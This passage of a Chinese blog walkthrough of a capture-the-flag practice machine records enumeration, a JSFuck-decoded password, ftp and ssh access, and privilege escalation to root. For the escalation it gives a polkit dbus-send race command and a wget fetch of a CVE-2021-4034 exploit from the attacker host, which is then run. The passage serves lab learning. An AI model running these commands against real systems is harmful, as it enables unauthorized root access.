class="hljs-built_in">timeout</span><br>?               <span class="hljs-built_in">print</span> <span class="hljs-built_in">help</span> information<br>tftp&gt; status<br>Connected to 192.168.56.112.<br>Mode: netascii Verbose: off Tracing: off<br>Rexmt-interval: 5 seconds, Max-<span class="hljs-built_in">timeout</span>: 25 seconds<br></code></pre></td></tr></table></figure>
+
+<p>连接成功了，但是 tfpt 无法列出文件列表，先暂时搁置。之后我又反复翻了翻 nfs 挂载中的各个文件夹，能确定的是这台靶机的桌面服务可能用的是 gnome，还有 gpg 软件，另外有一些 db 文件，但是没什么有价值的信息，似乎是访问信息的汇总（网站记录了多个访问信息）。到这里得到的有价值的信息仅限于一个用户名 <code>morris</code>，看一看 Web 服务吧</p>
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>index 界面加载了很久</p>
+<p><img src="/pic/0227b8e4e8ef8e98b73888276757ac08_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>首先看看内容，大意是姐弟的名字只差了 M 和 N，剩余部分是完全一致的，那我们又得到了一个用户名<code>norris</code>，再就是这个网站中有一些备份，以及一些挑战游戏</p>
+<p>看了看网页源代码，没有什么隐藏信息，上面的按钮指向 <code>index.htm</code> 也就是此界面。目录爆破一下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t64 -x txt,zip,sql,rar,php,htm <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.112<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              rar,php,htm,txt,zip,sql<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/12 09:44:29 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.htm            (Status: 200) [Size: 2186]<br>/.htm                 (Status: 403) [Size: 293]<br>/images               (Status: 301) [Size: 317] [--&gt; http://192.168.56.112/images/]<br>/manual               (Status: 301) [Size: 317] [--&gt; http://192.168.56.112/manual/]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.112/javascript/]<br>/hits.txt             (Status: 200) [Size: 44]<br>/backups              (Status: 200) [Size: 6301]<br>/mysite               (Status: 301) [Size: 317] [--&gt; http://192.168.56.112/mysite/]<br>/.htm                 (Status: 403) [Size: 293]<br>/server-status        (Status: 403) [Size: 302]<br>Progress: 1543646 / 1543927 (99.98%)===============================================================<br>2023/06/12 09:47:01 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>一些值得关注的目录：&#x2F;images,&#x2F;manual,&#x2F;hits.txt,&#x2F;backups,&#x2F;mysite 优先看一下 hits.txt，得到以下这样一句话，提醒我们要更强地枚举</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-comment">Remember! Keep your enumeration game strong!</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来逐个看看目录下有什么信息</p>
+<p><img src="/pic/b545a1a530fe57030b285dad593ece46_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>images 目录下有两个图片，也就是刚才主页上看到的图片，把他们下载下来，看看是否有隐写信息，分别使用 <code>file</code>, <code>exiftool</code>, <code>binwalk</code> 来判断是否有隐写信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ file game.jpg m.gif<br>game.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 192x192, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=6, orientation=upper-left], progressive, precision 8, 712x350, components 3<br>m.gif:    GIF image data, version 89a, 245 x 245<br></code></pre></td></tr></table></figure>
+
+<p>文件头正常</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ binwalk game.jpg m.gif<br><br>Scan Time:     2023-06-12 10:01:48<br>Target File:   /home/kali/Downloads/connectthedots/game.jpg<br>MD5 Checksum:  338f994c6e56b436b5db64049e81a5d2<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br>30            0x1E            TIFF image data, big-endian, offset of first image directory: 8<br><br><br>Scan Time:     2023-06-12 10:01:48<br>Target File:   /home/kali/Downloads/connectthedots/m.gif<br>MD5 Checksum:  7b76f7dcf7e2569ec2a64de68f850517<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             GIF image data, version <span class="hljs-string">&quot;89a&quot;</span>, 245 x 245<br><br></code></pre></td></tr></table></figure>
+
+<p>binwalk 显示没有拼接的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ exiftool game.jpg                                                                                  <br>ExifTool Version Number         : 12.57<br>File Name                       : game.jpg<br>Directory                       : .<br>File Size                       : 38 kB<br>File Modification Date/Time     : 2019:10:10 14:08:19-04:00<br>File Access Date/Time           : 2023:06:12 10:01:09-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:00:40-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 192<br>Y Resolution                    : 192<br>Exif Byte Order                 : Big-endian (Motorola, MM)<br>Orientation                     : Horizontal (normal)<br>Image Width                     : 712<br>Image Height                    : 350<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)<br>Image Size                      : 712x350<br>Megapixels                      : 0.249<br><br>┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ exiftool m.gif   <br>ExifTool Version Number         : 12.57<br>File Name                       : m.gif<br>Directory                       : .<br>File Size                       : 933 kB<br>File Modification Date/Time     : 2019:10:10 14:12:14-04:00<br>File Access Date/Time           : 2023:06:12 10:01:09-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:00:50-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : GIF<br>File Type Extension             : gif<br>MIME Type                       : image/gif<br>GIF Version                     : 89a<br>Image Width                     : 245<br>Image Height                    : 245<br>Has Color Map                   : Yes<br>Color Resolution Depth          : 8<br>Bits Per Pixel                  : 8<br>Background Color                : 255<br>Animation Iterations            : Infinite<br>XMP Toolkit                     : Adobe XMP Core 5.3-c011 66.145661, 2012/02/06-14:56:27<br>Creator Tool                    : Adobe Photoshop CS6 (Macintosh)<br>Instance ID                     : xmp.iid:085685312E1611E2A32B9E634BBB29DA<br>Document ID                     : xmp.did:085685322E1611E2A32B9E634BBB29DA<br>Derived From Instance ID        : xmp.iid:A5C200202E1511E2A32B9E634BBB29DA<br>Derived From Document ID        : xmp.did:085685302E1611E2A32B9E634BBB29DA<br>Transparent Color               : 255<br>Frame Count                     : 25<br>Duration                        : 2.50 s<br>Image Size                      : 245x245<br>Megapixels                      : 0.060<br></code></pre></td></tr></table></figure>
+
+<p>exiftool 显示的结果中也没有有价值的信息，有一丢丢烦躁了。继续查看别的目录吧</p>
+<p><img src="/pic/c92d9bb6f08fba9bc68bd64f38419131_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>backups 给了一个视频，关于这个视频里有没有隐藏信息，其实也需要留心，这里我只留下一个标记，等没头绪的话，再考虑视频信息隐藏的可能性。</p>
+<p><img src="/pic/d63de15867a560e1991a0c41f8ff628a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>manual 是 apache 的手册，简单看了眼，没什么可以利用地方，这种应该是默认的界面，出现漏洞话，应该是 apache 本身有漏洞才有可能，搜了一下 apache 这个版本的漏洞，只有一个提权漏洞，暂时没什么价值</p>
+<p><img src="/pic/5d2db95f8a3cd0eeb26deab9728de09f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里是网站目录下的文件，但是有个文件是 cs 后缀和平常文件似乎不一样，保存打开看看</p>
+<p><img src="/pic/aa431a16060a553fe9e0b79712c42fdb_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里并不知道到底是什么奇奇怪怪的语言，直接搜索也没有搜索到，先看了看红队笔记，原来是 JSFuck（，去掉一些无关的字符，然后去在线网站<a target="_blank" rel="noopener" href="https://jsfuck.com/#">JSFuck - Write any JavaScript with 6 Characters: <a href=""></a>!+</a>，得到了密码 <code>TryToGuessThisNorris@2k19</code></p>
+<p><img src="/pic/5d23246930d2729618b15fc7772a0df0_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试用这个密码登录 ssh、ftp，这里要记得我们有两个用户名 <code>morris</code> 和 <code>norris</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec/.cache/evolution/tasks]<br>└─$ ftp 192.168.56.112<br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): norris<br>331 Please specify the password.<br>Password: <br>421 Timeout.<br>ftp: Login failed<br>ftp&gt; e<br>?Ambiguous <span class="hljs-built_in">command</span>.<br>ftp&gt; <span class="hljs-built_in">exit</span><br><br>┌──(kali㉿kali)-[/tmp/infosec/.cache/evolution/tasks]<br>└─$ ftp 192.168.56.112                                        <br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): norris<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||62846|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 1001     1001         4096 Oct 11  2019 files<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> files<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||27359|)<br>150 Here comes the directory listing.<br>-r--------    1 1001     1001         6301 Oct 11  2019 backups.bak<br>-r--------    1 1001     1001        39610 Oct 11  2019 game.jpg.bak<br>-r--------    1 1001     1001           29 Oct 11  2019 hits.txt.bak<br>-r--------    1 1001     1001       932659 Oct 11  2019 m.gif.bak<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br></code></pre></td></tr></table></figure>
+
+<p>ftp 中得到了一些备份文件，稍后逐个检查，不过看起来是我们之前在查看网页目录结构时看到的信息的备份</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ssh -i id_rsa morris@192.168.56.112 -p 7822<br>morris@192.168.56.112\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Permission denied, please try again.</span><br><span class="hljs-string">morris@192.168.56.112\&#x27;</span>s password: <br><br><br>┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ssh norris@192.168.56.112 -p 7822  <br>norris@192.168.56.112\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string"></span><br><span class="hljs-string">###</span><br><span class="hljs-string">   #     #    #     #     #####     #      ##     #####     #    #    #   ####</span><br><span class="hljs-string">   #     ##   #     #       #       #     #  #      #       #    ##   #  #    #</span><br><span class="hljs-string">   #     # #  #     #       #       #    #    #     #       #    # #  #  #</span><br><span class="hljs-string">   #     #  # #     #       #       #    ######     #       #    #  # #  #  ###</span><br><span class="hljs-string">   #     #   ##     #       #       #    #    #     #       #    #   ##  #    #</span><br><span class="hljs-string">  ###    #    #     #       #       #    #    #     #       #    #    #   ####</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Mon Jun 12 20:03:57 2023 from 192.168.56.106</span><br><span class="hljs-string">norris@sirrom:~$ pwd</span><br><span class="hljs-string">/home/norris</span><br><span class="hljs-string">norris@sirrom:~$ ls</span><br><span class="hljs-string">ftp  user.txt</span><br></code></pre></td></tr></table></figure>
+
+<p>使用刚才的密码，ssh 登录 norris 用户成功，ftp 目录就在当前用户的目录下</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看 suid</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:~$ find / -<span class="hljs-built_in">type</span> f -perm -u=s 2&gt;/dev/null<br>/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper<br>/usr/lib/xorg/Xorg.wrap<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/sbin/pppd<br>/usr/sbin/mount.nfs<br>/usr/bin/gpasswd<br>/usr/bin/umount<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/bin/fusermount<br>/usr/bin/chfn<br>/usr/bin/bwrap<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/pkexec<br>/usr/bin/ntfs-3g<br>/usr/bin/chsh<br>/usr/bin/sudo<br></code></pre></td></tr></table></figure>
+
+<p>这里自己尝试了一些漏洞，主要是针对 polkit 的漏洞 <a target="_blank" rel="noopener" href="https://ine.com/blog/exploiting-pwnkit-cve-20214034">Lab Walkthrough - Exploiting PwnKit (CVE-2021–4034) | INE</a> 这篇文章是针对 CVE-2021-4034 的，但是有个问题是靶机中 gcc 无法使用，后续又看到了有使用 CVE-2021-3560 漏洞的 <a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/polkit-privilege-escalation/">PolKit Privilege Escalation | Exploit Notes (hdks.org)</a>。但是尝试失败了还参考了这篇文章 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/556166195">vulnhub刷题记录（Dripping Blues: 1） - 知乎 (zhihu.com)</a> </p>
+<blockquote>
+<p>它允许非特权用户使用 DBus 调用特权方法，在这个漏洞中我们将调用 accountservice 提供的 2 个特权方法（CreateUser 和 SetPassword），这允许我们创建一个特权用户然后为其设置密码，最后以创建的用户身份登录，然后提升为root。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/usr/bin$ time dbus-send --system --dest=org.freedesktop.Accounts --<span class="hljs-built_in">type</span>=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:ignite string:<span class="hljs-string">&quot;ignite user&quot;</span> int32:1Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required<br><br>real    0m0.008s<br>user    0m0.001s<br>sys     0m0.000s<br>norris@sirrom:/usr/bin$ dbus-send --system --dest=org.freedesktop.Accounts --<span class="hljs-built_in">type</span>=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:<span class="hljs-string">&quot;Tester Account&quot;</span> int32:1 &amp; <span class="hljs-built_in">sleep</span> 0.0015s; <span class="hljs-built_in">kill</span> $!<br>[1] 2990<br>norris@sirrom:/usr/bin$ <span class="hljs-built_in">id</span> tester<br><span class="hljs-built_in">id</span>: ‘tester’: no such user<br>[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --<span class="hljs-built_in">type</span>=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:<span class="hljs-string">&quot;Tester Account&quot;</span> int32:1<br>norris@sirrom:/usr/bin$ <span class="hljs-built_in">id</span> tester<br><span class="hljs-built_in">id</span>: ‘tester’: no such user<br></code></pre></td></tr></table></figure>
+
+<h3 id="Linux-Polkit-权限提升漏洞CVE-2021-4034"><a href="#Linux-Polkit-权限提升漏洞CVE-2021-4034" class="headerlink" title="Linux Polkit 权限提升漏洞CVE-2021-4034"></a>Linux Polkit 权限提升漏洞CVE-2021-4034</h3><p>后续看了眼红队笔记，给的提权思路很好，但是强经验相关，因此自己又找了别的 exp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44287822/article/details/123743693">(4条消息) Linux Polkit 权限提升漏洞CVE-2021-4034_灬半醉半醒半痴呆つ的博客-CSDN博客</a> 其中提到了一个脚本 <a target="_blank" rel="noopener" href="https://github.com/dzonerzy/poc-cve-2021-4034">https://github.com/dzonerzy/poc-cve-2021-4034</a> 。将其下载到本地，然后靶机访问本机的 http 服务按照脚本里的内容，将文件下载到 tmp 目录下，然后直接运行就可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">norris@sirrom:/tmp$ wget http://192.168.56.106:8088/exploit -O exploit<br>--2023-06-13 06:30:13--  http://192.168.56.106:8088/exploit<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4442423 (4.2M) [application/octet-stream]<br>Saving to: ‘exploit’<br><br>exploit                      100%[==============================================&gt;]   4.24M  --.-KB/s    <span class="hljs-keyword">in</span> 0.03s   <br><br>2023-06-13 06:30:13 (123 MB/s) - ‘exploit’ saved [4442423/4442423]<br><br>norris@sirrom:/tmp$ <span class="hljs-built_in">ls</span><br>exploit<br>norris@sirrom:/tmp$ <span class="hljs-built_in">chmod</span> +x exploit <br>norris@sirrom:/tmp$ ./exploit <br>2023/06/13 06:30:28 CMDTOEXECUTE is empty fallback to default value<br>2023/06/13 06:30:28 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),27(sudo),1001(norris)<br><span class="hljs-comment"># cat /root/root.txt</span><br>8fc9376d961670ca10be270d52eda423<br></code></pre></td></tr></table></figure>
+
+<h2 id="补充思路"><a href="#补充思路" class="headerlink" title="补充思路"></a>补充思路</h2><h3 id="横向用户切换"><a href="#横向用户切换" class="headerlink" title="横向用户切换"></a>横向用户切换</h3><p>ftp 中有一些bak文件，但是之前没有仔细查看，这里仔细对文件进行检查</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ exiftool *.bak                                                                                     <br>======== backups.bak<br>ExifTool Version Number         : 12.57<br>File Name                       : backups.bak<br>Directory                       : .<br>File Size                       : 6.3 kB<br>File Modification Date/Time     : 2019:10:10 22:47:30-04:00<br>File Access Date/Time           : 2023:06:12 10:26:39-04:00<br>File Inode Change Date/Time     : 2023:06:12 10:26:39-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : MP4<br>File Type Extension             : mp4<br>MIME Type                       : video/mp4<br>Major Brand                     : Unknown (mp4v)<br>Minor Version                   : 0.0.0<br>Compatible Brands               : mp4v, mp42, isom<br>Movie Header Version            : 0<br>Create Date                     : 0000:00:00 00:00:00<br>Modify Date                     : 0000:00:00 00:00:00<br>Time Scale                      : 2285<br>Duration                        : 3.06 s<br>Preferred Rate                  : 1<br>Preferred Volume                : 100.00%<br>Preview Time                    : 0 s<br>Preview Duration                : 0 s<br>Poster Time                     : 0 s<br>Selection Time                  : 0 s<br>Selection Duration              : 0 s<br>Current Time                    : 0 s<br>Next Track ID                   : 2<br>Track Header Version            : 0<br>Track Create Date               : 0000:00:00 00:00:00<br>Track Modify Date               : 0000:00:00 00:00:00<br>Track ID                        : 1<br>Track Duration                  : 3.06 s<br>Track Layer                     : 0<br>Track Volume                    : 100.00%<br>Matrix Structure                : 1 0 0 0 1 0 0 0 1<br>Image Width                     : 224<br>Image Height                    : 224<br>Media Header Version            : 0<br>Media Create Date               : 0000:00:00 00:00:00<br>Media Modify Date               : 0000:00:00 00:00:00<br>Media Time Scale                : 2285<br>Media Duration                  : 3.06 s<br>Media Language Code             : und<br>Handler Type                    : Video Track<br>Graphics Mode                   : srcCopy<br>Op Color                        : 0 0 0<br>Compressor ID                   : avc1<br>Source Image Width              : 224<br>Source Image Height             : 224<br>X Resolution                    : 72<br>Y Resolution                    : 